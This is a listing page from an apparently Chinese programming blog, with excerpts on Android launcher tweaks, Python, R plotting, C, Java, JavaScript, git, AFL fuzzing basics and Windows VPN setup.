			<a href="/posts/d9da9bb06e4c53f1f6b6081b17353262/" rel="bookmark">
			Android11 Launcher3调整app图标的显示顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		比如我们的apk的包名是 com.example.test，想显示在第一个位置，如何做？ 在 AlphabeticalAppsList的 onAppsUpdated 方法的最后一行
updateAdapterItems(); 之前添加如下代码：
AppInfo temp = null ; for(AppInfo a :mApps){ if(a.componentName.getPackageName().equals("com.example.test")){ temp = a ; break; } } if(temp != null){ mApps.remove(temp); mApps.add(0,temp); } 以下是修改前后的对比图：
可以看出test2显示在了第一个位置上 。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a1735bf6efb47ea80474e7d07b0abd/" rel="bookmark">
			Python 判断素数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在 Python 中可以使用以下方法来判断一个数是否为素数:
直接枚举 可以使用 for 循环枚举所有小于该数的自然数, 并依次判断这些数是否能够被整除。如果有一个数能够被整除, 则该数不是素数。代码如下:
def is_prime(n): if n &lt; 2: return False for i in range(2, n): if n % i == 0: return False return True 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/822a08ba0fab1681336f28ea83d7ada5/" rel="bookmark">
			【R语言】——基因GO/KEGG功能富集结果可视化（保姆级教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上期“原来基因功能富集分析这么简单”介绍如何使用DAVID在线分析工具对基因进行GO/KEGG功能富集分析。本期则介绍使用R语言ggplot包对DAVID在线分析工具所获得的基因GO/KEGG功能富集结果进行可视化。
1 数据准备
数据输入格式（xlsx格式）：
注：DAVID导出来的“%”这列为“Gene ratio”；上面只展示“BP”的数据，其余“CC”和“MF”也是类似格式，故不一一列举。
2　R包加载、数据导入及处理
#下载包# install.packages("dplyr") install.packages("ggplot2") install.packages("tidyverse") install.packages("openxlsx") #加载包# library (dplyr) library (ggplot2) library(tidyverse) library(openxlsx) #数值导入# BP = read.xlsx('C:/Rdata/jc/enrich-gene.xlsx',sheet= "go_result_BP",sep=',') CC = read.xlsx('C:/Rdata/jc/enrich-gene.xlsx',sheet= "go_result_CC",sep=',') MF = read.xlsx('C:/Rdata/jc/enrich-gene.xlsx',sheet= "go_result_MF",sep=',') head(BP) ###数据导入数据处理### #ego = rbind(go_result_BP,go_result_CC,go_result_MF) #将三个组进行合并，需要合并可选择 #ego = ego[,1:3] #提取前几列进行操作，有需要可选择 #print(ego) #预览数据 #DVIAD获得的数据term列是GO:0005251~delayed rectifier potassium channel activity形式的，故需要将其拆分。可在Excel中进行分列也可以应用一下函数进行分列。 BP = separate(BP,Term, sep="~",into=c("ID","Description")) CC = separate(CC,Term, sep="~",into=c("ID","Description")) MF = separate(MF,Term, sep="~",into=c("ID","Description")) #提取各组数据需要展示的数量# display_number = c(15, 10, 5) ##这三个数字分别代表选取的BP、CC、MF的数量 go_result_BP = as.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/822a08ba0fab1681336f28ea83d7ada5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/477a7fd82bb8f29ddcddf1430034d731/" rel="bookmark">
			十六进制字符串转换成十进制数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; int main() { 下面有讲解！！！！！！！ char arr[100]={0}; scanf("%s",arr); int m=0; int sz=strlen(arr); int i=0; for(i=0;i&lt;sz;i++) { if(arr[i]&gt;='0'&amp;&amp;arr[i]&lt;='9'){ m=m*16+arr[i]-'0'; } else { m=m*16+arr[i]-'A'+10; } } printf("%d",m); return 0; } m=m*16+arr[i]-'0'; 减'0'的目的就是将arr[i]中的字符转化成数字 假设字符串是123转换成10进制 循环第一圈：m=0*16+1; 第二圈：m=1*16+2; 第三圈：m=(1*16+2)*16+3，这不就相当于(1*16^2)+(2*16^1)+(3*16^0) 结果为：291 m=m*16+arr[i]-'A'+10; 这里为什么要加10因为A在16进制中表示10 比如：假设arr[i]='C'; arr[i]-'A'+10 = 'C'-'A'+10 = 12 12不就对应16进制中的C 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/494ee7d7a20f5dc25acce276b6f5241c/" rel="bookmark">
			【mysql启动】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一定要记住先进入到mysql 的安装目录
然后mysql -u root -p
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/477ec39603e1670b50e672d517e2a67f/" rel="bookmark">
			C#解决Bitmap导致的内存溢出问题 参数保存与加载 序列化与与反序列化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.C#解决Bitmap导致的内存溢出问题
System.GC.Collect();//垃圾回收 清内存 不然图片一直增加内存 2.参数保存与加载
把所有要保存的参数放在一个类 修改参数后，把类对象序列化保存，在启动时反序列化到对象。 如果新增参数，类中新增即可，其他不变。 涉及类，序列化与与反序列化，保存，读取。序列化的格式文件人类不方便读与修改。
参数类
[Serializable] public class Para { public int height = 16; public int width = 16; public int xOffset = 0; public int yOffset = 0; public int dotSize = 4; public int dotInteval = 1; public Font myFont = new System.Drawing.Font(System.Drawing.SystemFonts.DefaultFont.Name, System.Drawing.SystemFonts.DefaultFont.Size); [NonSerialized] public string memo="小黄人软件"; //不参与序列化 } 封装的类及调用示例 using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Runtime.Serialization; using System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/477ec39603e1670b50e672d517e2a67f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b70c7aaf79261b72f5adcb25c56d8328/" rel="bookmark">
			elementUI的el-backtop(返回顶部)不生效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 问题：使用el-backtop时，指定target对象为父级元素后不显示 目前我采用的方法是简单粗暴的删除target不指定对象， 也是能显现按钮，并且回到顶部。
&lt;el-backtop :visibility-height="100"&gt; &lt;i class="el-icon-caret-top"&gt;&lt;/i&gt; &lt;/el-backtop&gt; 有时间可以研究下 Element-ui不用多说，用Vue的基本都会用到它。但是它的官方文档却有些不严谨的地方，最近我就在弄一个返回顶部的功能的时候遇到坑了。废话不多说，先上官方文档示例介绍：
Scroll down to see the bottom-right button. &lt;template&gt; Scroll down to see the bottom-right button. &lt;el-backtop target=".page-component__scroll .el-scrollbar__wrap"&gt;&lt;/el-backtop&gt; &lt;/template&gt; 这个是基础用法，自定义用法跟这个也差不多，就是中间加了些样式。 看起来这个例子很简单对不对，按照最简单的原则拿过来就用，Ctrl+C到自己项目后就等着出现回到顶部按钮，结果实际结果却令我大失所望，直接报错了。错误原因就是找不到el-scrollbar__wrap。
既然给出了原因，那解决应该很简单，不是找不到这个样式吗，那我就在外层套个div 然后定义个class=el-scrollbar__wrap，心想这下子应该是可以了吧。结果运行的时候错误是没有了，但是那个心心念念的回到顶部按钮怎么都出现不了，难道是我姿势不对？然后我就再外面又套了div class=page-component__scroll，但是还是没有卵用。
终极使用示例： html,body { height: 100%; } &lt;template&gt; &lt;div id="app"&gt; &lt;div class="content"&gt; &lt;div class="backtop"&gt;&lt;/div&gt; &lt;el-backtop target=".content .backtop"&gt;&lt;/el-backtop&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;style&gt; html,body { height: 100%; } #app { height: 100%; } .content { height: 100%; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b70c7aaf79261b72f5adcb25c56d8328/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1812f38347b72bba148276a1c3f71ec0/" rel="bookmark">
			JVM-垃圾回收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、GC分类
（1）部分收集（Partial GC）
新生代收集（Minor GC/Young GC）：只对新生代进行垃圾收集。（读音[ˈmaɪnə(r)]）
老年代收集（Major GC/Old GC）：只对老年代进行垃圾收集。（读音[ˈmeɪdʒə(r)]）
混合收集（Mixed GC）：对整个新生代和部分老年代进行垃圾收集。
（2）整堆收集（Full GC）
收集整个Java堆和方法区。
2、死亡对象判断方法
（1）引用计数法
给对象中添加一个引用计数器：每当有一个地方引用它，计数器就加1；当引用失效，计数器就减1；任何时候计数器为0的对象就是不可能再被使用的。
这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间相互循环引用的问题。
（2）可达性分析算法
这个算法的基本思想就是通过一系列的称为“GC Roots”的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到GC Roots没有任何引用链相连的话，则证明此对象是不可用的，需要被回收。
即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程。
3、垃圾收集算法
（1）标记-清除算法
首先标记出所有不需要回收的对象，在标记完成后统一回收掉所有没有被标记的对象。
效率问题，标记和清除两个过程的效率都不高。空间问题，标记清除后会产生大量不连续的碎片。
（2）标记-复制算法
将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。
（3）标记-整理算法
标记过程与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。
（4）分代收集算法
据各个年代的特点选择合适的垃圾收集算法。
比如在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。
4、垃圾收集器
垃圾收集器就是内存回收的具体实现。
（1）Serial收集器
单线程收集器，只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（"Stop The World"），直到它收集结束。
新生代采用标记-复制算法，老年代采用标记-整理算法。
简单而高效。
（2）ParNew收集器
ParNew收集器其实就是Serial收集器的多线程版本。
新生代采用标记-复制算法，老年代采用标记-整理算法。
（3）Parallel Scavenge收集器
多线程收集器。
Parallel Scavenge收集器关注点是吞吐量（高效率的利用CPU）。
新生代采用标记-复制算法，老年代采用标记-整理算法。
JDK1.8默认使用的是Parallel Scavenge和Parallel Old。
（4）Serial Old收集器
Serial收集器的老年代版本。
（5）Parallel Old收集器
Parallel Scavenge收集器的老年代版本。
（6）CMS收集器
CMS收集器是一种以获取最短回收停顿时间为目标的收集器。
CMS收集器是HotSpot虚拟机第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程（基本上）同时工作。
主要优点：并发收集、低停顿。
主要缺点：对CPU资源敏感；无法处理浮动垃圾；它使用的回收算法“标记-清除”算法会导致收集结束时会有大量空间碎片产生。
（7）G1收集器
G1是一款面向服务器的垃圾收集器，主要针对配备多颗处理器及大容量内存的机器。以极高概率满足GC停顿时间要求的同时，还具备高吞吐量性能特征。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0eba5d2d5994a5844460d599b56fd1c/" rel="bookmark">
			网页轮播图的实现方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		轮播图 轮播图是Web开发中常见的组件之一，通常第三方框架都自带这个组件，或是通过使用第三方插件实现，无需程序员自己重新编码，但在面试中会被问道其实现原理。轮播图的实现方式有很多种，本文轮播图实现代码来自[黑马程序员的视频教程]，纯js实现，支持无缝滚动。
动画 在实现轮播图前，我们需要封装一个动画函数。
function animate(obj, target) { obj.timer = setInterval(function () { var step = (target - obj.offsetLeft) / 10; if (obj.offsetLeft &gt;= target) clearInterval(obj.timer); obj.style.left = obj.offsetLeft + step + "px"; }, 15); } // 调用 var div = document.querySelector("div"); div.addEventListener("click", function () { animate(div, 300); }); 这里会存在一个Bug，就是多次点击div盒子触发animate()函数，导致有多个定时器的步长累加，速度随点击次数增加。
解决办法：
1.创建定时器前先清除
// 清除定时器 clearInterval(obj.timer); // 创建定时器 obj.timer = setInterval(function () { ... } 2.通过if判断定时器是否被创建，没有创建则执行创建定时器代码
if (typeof obj.timer == "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0eba5d2d5994a5844460d599b56fd1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6273d58e12618e63ae1ffd387f75703/" rel="bookmark">
			Java学习笔记【7】面向对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐
🌀 个人首页：🏠 星空之路Star 🏠
🌀 所属专栏：📖 Java知识点总结 📖
🌀 大家好🤝 我是 👉老孙👈
🌀 喜欢用博客记录人生 ✍️
🌀 未来学习路上请多多关照 🙏
🌀 星光不问赶路人, 时光不负有心人🕣
⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐ ⭐
面向对象目录： 一、面向对象概述1、面向过程和面向对象2、面向对象的三大特征3、面向对象的思想概述 二、类和对象创建和使用三、封装1、四种访问权限修饰符2、封装性的体现 四、继承五、多态1、多态性概述2、instanceof操作符3、类型转换 六、类的五大内部结构1、属性（Field）2、方法（Method）3、构造器/构造方法（Constructor）4、代码块（Code Block）5、内部类（Inner Class） 七、方法的重载和重写1、重载 (Overload)2、重写 (Override) 八、抽象类九、接口1、接口的概念2、接口的特点和语法3、接口的应用：代理模式4、接口的应用：工厂模式5、接口和抽象类之间的对比 一、面向对象概述 1、面向过程和面向对象 面向过程(POP) 与 面向对象(OOP)对比：
二者都是一种思想，面向对象是相对于面向过程而言的。面向过程，强调的是功能行为，以函数为最小单位，考虑怎么做。面向对象，将功能封装进对象，强调具备了功能的对象，以类/对象为最小单位，考虑谁来做。面向对象更加强调运用人类在日常的思维逻辑中采用的思想方法与原则，如抽象、分类、继承、聚合、多态等。 典型例子：人把大象装进冰箱？
2、面向对象的三大特征 封装性 (Encapsulation) 一层含义是指把对象的属性和行为看成是一个密不可分的整体，将这两者 “封装” 在一起，即封装在对象中。另一层含义是指 “信息隐藏”，将不想让外界知道的信息隐藏起来。例如，驾校的学员学开车，只需要知道如何操作汽车，无需知道汽车内部是如何工作的。 继承性 (Inheritance) 继承性主要描述类与类之间的关系，通过继承，可以在无需重新编写原有类的情况下，对原有类的功能进行扩展。继承不仅增强了代码的复用性，提高了开发效率，还降低了程序产生错误的可能性，有利于程序的维护和扩展。 多态性 (Polymorphism) 多态性是指在一个类中定义的属性和方法被其他类继承之后，他们可以具有不同的数据类型或表现出不同的行为，这使得同一个属性和方法在不同的类中具有不同的语义。 3、面向对象的思想概述 程序员从面向过程的 执行者 转化成了面向对象的 指挥者面向对象分析方法分析问题的思路和步骤： 根据问题需要，选择问题所针对的 现实世界中的实体。从实体中寻找解决问题相关的属性和功能，这些属性和功能就形成了 概念世界中的类。把抽象的实体用计算机语言进行描述，形成计算机世界中类的定义。即借助某种程序语言，把类构造成计算机能够识别和处理的数据结构。将 类实例化成计算机世界中的对象，对象是计算机世界中解决问题的最终工具。 二、类和对象创建和使用 类（Class）和 对象（Object）是面向对象的核心概念：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6273d58e12618e63ae1ffd387f75703/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3cba6a5555beff67331b2ab749de09c/" rel="bookmark">
			力扣-Java岛屿数量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题解： class Solution { public int numIslands(char[][] grid) { int count = 0; for (int i = 0; i &lt; grid.length; i++){ for (int j=0; j &lt; grid[0].length; j++){ if (grid[i][j] == '1'){//如果是陆地 count++; dfs(grid, i,j );//基于1不停的扩散，把周边的1和自身全部改成1 } } } return count; } /** *以x，y坐标展开岛屿，将值设置为2 */ public void dfs(char[][] grid, int x, int y){ if (x &lt; 0 || y &lt; 0|| y &gt;= grid[0].length || x &gt;= grid.length || grid[x][y] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3cba6a5555beff67331b2ab749de09c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c55c1cedf837b22ffc53ee6977ffa7fa/" rel="bookmark">
			Strategy pattern
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 概念需求CodeSpirng JdbcTemplate 中使用不同策略来处理结果集总结 概念 策略模式作为一种软件设计模式，指对象有某个行为，但是在不同的场景中，该行为有不同的实现算法。比如每个人都要“交个人所得税”，但是“在美国交个人所得税”和“在中国交个人所得税”就有不同的算税方法。 策略模式： 定义了一族算法； 封装了每个算法； 这族的算法可互换代替
——Wikipedia
需求 设计一个 Sorter 类，可以根据不同的比较策略对对象进行排序。
比如现在有一个 Cat 类数组，我需要根据 Cat 类的 weight 属性对 Cat 数组进行排序。
Code Cat.java
public class Cat{ int weight, height; public Cat(int weight, int height) { this.weight = weight; this.height = height; } @Override public String toString() { return "Cat{" + "weight=" + weight + ", height=" + height + '}'; } } Sorter.java
public class Sorter&lt;T&gt; { public void sort(T[] arr, Comparator&lt;T&gt; comparator) { for(int i=0; i&lt;arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c55c1cedf837b22ffc53ee6977ffa7fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a7c26cd7fba5f80d02278783cb896f4/" rel="bookmark">
			Java实现多线程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
基本概念
1、程序、进程、线程
2、使用线程的优点
3、线程的分类
4、线程的生命周期
多线程的实现方法
1、继承Thread类
2、实现Runnable接口
3、实现Callable接口
4、使用线程池
线程同步
1、同步代码、同步方法
2、同步机制中的锁
3、锁（Lock）
4、线程的通信
5、经典例题：
（1）生产者消费者问题
（2）车票问题
基本概念 1、程序、进程、线程 首先先来了解关于什么是程序、进程、线程
程序(program)是为完成特定任务、用某种语言编写的一组指令的集合。即指一段静态的代
码，静态对象。 进程(process)是程序的一次执行过程，或是正在运行的一个程序。是一个动态 的过程：有它自身的产生、存在和消亡的过程。—生命周期 1、如：运行中的QQ，运行中的MP3播放器 2、程序是静态的，进程是动态的 3、进程作为资源分配的单位， 系统在运行时会为每个进程分配不同的内存区域 线程(thread)，进程可进一步细化为线程，是一个程序内部的一条执行路径。 1、若一个进程同一时间并行执行多个线程，就是支持多线程的。 2、线程作为调度和执行的单位，每个线程拥有独立的运行栈和程序计数器(pc)，线程切换的开销小。 3、一个进程中的多个线程共享相同的内存单元/内存地址空间 -&gt; 它们从同一堆中分配对象，可以访问相同的变量和对象。这就使得线程间通信更简便、高效。但多个线程操作共享的系统资源可能就会带来安全的隐患。 进程与线程 一个Java应用程序java.exe，其实至少有三个线程：main()主线程，gc() 垃圾回收线程，异常处理线程。当然如果发生异常，会影响主线程。 2、使用线程的优点 1、提高应用程序的响应。对图形化界面更有意义，可增强用户体验。 2、提高计算机系统CPU的利用率。 3、改善程序结构。将既长又复杂的进程分为多个线程，独立运行，利于理解和修改。 3、线程的分类 Java中的线程分为两类：一种是守护线程，一种是用户线程。 1、它们在几乎每个方面都是相同的，唯一的区别是判断JVM何时离开。 2、守护线程是用来服务用户线程的，通过在start()方法前调用 thread.setDaemon(true)可以把一个用户线程变成一个守护线程。 3、Java垃圾回收就是一个典型的守护线程。 4、若JVM中都是守护线程，当前JVM将退出。 4、线程的生命周期 （1）JDK 中用 Thread.State 类定义了线程的几种状态 要想实现多线程，必须在主线程中创建新的线程对象。Java语言使用Thread类 及其子类的对象来表示线程，在它的一个完整的生命周期中通常要经历如下的五 种状态： 新建： 当一个Thread类或其子类的对象被声明并创建时，新生的线程对象处于新建状态 就绪：处于新建状态的线程被start()后，将进入线程队列等待CPU时间片，此时它已具备了运行的条件，只是没分配到CPU资源 运行：当就绪的线程被调度并获得CPU资源时,便进入运行状态， run()方法定义了线程的操作和功能 阻塞：在某种特殊情况下，被人为挂起或执行输入输出操作时，让出 CPU 并临时中止自己的执行，进入阻塞状态 死亡：线程完成了它的全部工作或线程被提前强制性地中止或出现异常导致结束 （2）线程周期的图例 多线程的实现方法 1、继承Thread类 Java语言的JVM允许程序运行多个线程，它通过java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a7c26cd7fba5f80d02278783cb896f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55850cf2d1b551a42c3277ebc9371eaa/" rel="bookmark">
			Fuzz-AFL入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Fuzz-AFL入门 工具 AFL 则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。原理是通过对源码进行重新编译时进行插桩（简称编译时插桩）的方式自动产生测试用例来探索二进制程序内部新的执行路径。AFL也支持直接对没有源码的二进制程序进行测试，但需要QEMU的支持。
安装使用 从 http://lcamtuf.coredump.cx/afl/ 下载源码，然后解压之后安装
make sudo make install 安装成功
安装目录
afl-gcc 和afl-g++ 分别对应的是gcc 和g++ 的封装
afl-clang 和afl-clang++ 分别对应clang 的c 和c++ 编译器封装À。
afl-fuzz 是AFL 的主体，用于对目标程序进行fuzz。
afl-analyze 可以对用例进行分析，通过分析给定的用例，看能否发现用例中有意义的字段。
afl-qemu-trace 用于qemu-mode，默认不安装，需要手工执行qemu-mode 的编译脚本进行编译，后面会介绍。
afl-plot 生成测试任务的状态图
afl-tmin 和afl-cmin 对用例进行简化
afl-whatsup 用于查看fuzz 任务的状态
afl-gotcpu 用于查看当前CPU 状态
afl-showmap 用于对单个用例进行执行路径跟踪
图片为我们使用AFL进行测试时的运行截图
整体来说，运行状态主要包括8个部分
process timing 这里展示了fuzz的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。
值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。
cycle progress 主要记录了当前正在处理的fuzz进程和由于超时放弃的路径数
stage progress 这里记录了包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度
执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing
fuzzing strategy yieldsoverrall results 这里包括运行的总周期数、总路径数、崩溃次数、超时次数。
其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由紫色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55850cf2d1b551a42c3277ebc9371eaa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a040a07803446942ab72a707ecdada6d/" rel="bookmark">
			关于GIT的常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于git常用的命令 仓库 # 在当前目录新建一个Git代码库 $ git init # 新建一个目录，将其初始化为Git代码库 $ git init [project-name] # 下载一个项目和它的整个代码历史 $ git clone [url] 配置 # 显示当前的Git配置 $ git config --list # 编辑Git配置文件 $ git config -e [--global] # 设置提交代码时的用户信息 $ git config [--global] user.name "[name]" $ git config [--global] user.email "[email address]" 增加/删除文件 # 添加指定文件到暂存区 $ git add [file1] [file2] ... # 添加指定目录到暂存区，包括子目录 $ git add [dir] # 添加当前目录的所有文件到暂存区 $ git add . # 添加每个变化前，都会要求确认 # 对于同一个文件的多处变化，可以实现分次提交 $ git add -p # 删除工作区文件，并且将这次删除放入暂存区 $ git rm [file1] [file2] .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a040a07803446942ab72a707ecdada6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f023143866a1abdb7648c7dc77dea3a3/" rel="bookmark">
			LF Professional及WINTERACTER产品简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LF专业版v7.9
LF Professional v7.8将32/64位Rainier编译器与经典的Lahey/Fujitsu LF95编译器相结合！Rainier完全符合Fortran 95/90/77标准，并广泛支持Fortran 2003和2008标准；针对32位和64位Windows。
Lahey/Fujitsu LF95提供一流的诊断功能。包括自动并行化GFortran编译器、Lahey/Fujitsu Fortran 95编译器、Visual Studio 2015 Shell、Lahey的独家Visual Studio Fortran支持、Winteracter WiSK图形包等！
Lahey/GNU Fortran-雷尼尔版
Windows 32/64位完全符合Fortran 95/90/77标准，广泛支持Fortran 2003和2008标准。自动并行化GFortran编译器、Visual Studio 2015 Shell、Lahey的独家Visual Studio Fortran支持、Winteracter WiSK图形包等等！
LF Express v7.3
原始动力。适用于Windows的全面优化Fortran 95/90/77/66命令行编译器和调试器。
WINTERACTER
Winteracter是Fortran编程语言的现代GUI工具集。它由各种可视化开发工具和大量子程序库组成。版本可用于各种Fortran编译器。Winteracter专为与支持Fortran 90或更高版本的编译器一起使用而设计。
产品亮点
1、使用新的Fortran标准创建基于GUI的现代应用程序。
2、基于原生Windows和Motif组件的GUI功能。
3、避免复杂的混合语言编程。完全基于Fortran。
4、无需低级API访问。
5、可视化工具简化了GUI设计。
6、有意义的名称使代码具有高度可读性且易于维护。
7、成熟的平台独立图形和操作系统界面。
8、支持多种图形硬拷贝/导出格式。
9、基于W交互器的程序的分发是免版税的。
10、通过电子邮件提供免费技术支持。
版本平台编译器15.0WindowsAbsoft Pro Fortran 11 及以上（32/64 位）
Intel Visual Fortran 10 及以上（32/64 位）
Lahey/Fujitsu Fortran 5.7/7.x（32 位）
Lahey/GNU Fortran（32/64 位）
GNU gfortran (MingGW) 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f023143866a1abdb7648c7dc77dea3a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db7913c65067a4f90716903493fb874e/" rel="bookmark">
			WinServer 2012 架设配置 VP* 服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境 VPN 服务器：WinServer 2012 外网IP：192.168.0.6 内网IP 10.10.10.1 Client 客户端：WinServer 2012 外网IP：192.168.0.7 通过建立 VPN 连接到内网 10.10.10.11 WEB 网站服务器：WinServer 2012 内网IP：10.10.10.2 需求 client 客户端电脑通过 VPN 连接 能访问WEB网站服务器内网IP 10.10.10.2 一、VPN 服务器 1、添加一块网卡，标准 VPN 配置需要 2 块网卡
编辑虚拟机设置 → 添加网络适配器 → 网络连接（选择自定义：仅主机模式）→ 启动虚拟机
此时多了一块网卡，为了方便记忆，把之前的网卡命名为 WAN, 新添的网卡 命名为 LAN
编辑 LAN 网卡IP 地址为 10.10.10.1 ，子网掩码为 255.255.255.0
编辑 WAN 网卡IP地址：192.168.0.6 子网掩码：255.255.255.0 网关：192.168.0.1 DNS：192.168.1.1 ping 下外网看通不通
2、添加 VPN 服务功能
添加角色 → 远程访问 添加 DirectAccess 和 VPN 与路由 服务
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db7913c65067a4f90716903493fb874e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77b3a2f1a7eaca318ca395718735e815/" rel="bookmark">
			Java基础 Scanner——获取键盘输入的值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
具体实现步骤：
next() 与 nextLine() 区别：
实例：
java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。
具体实现步骤： 导包：import java.util.Scanner;Scanner的实例化:Scanner scan = new Scanner(System.in);调用Scanner类的相关方法（next() / nextXxx()），来获取指定类型的变量 注意：需要根据相应的方法，来输入指定类型的值。如果输入的数据类型与要求的类型不匹配时，会报异常：InputMisMatchException 导致程序终止。
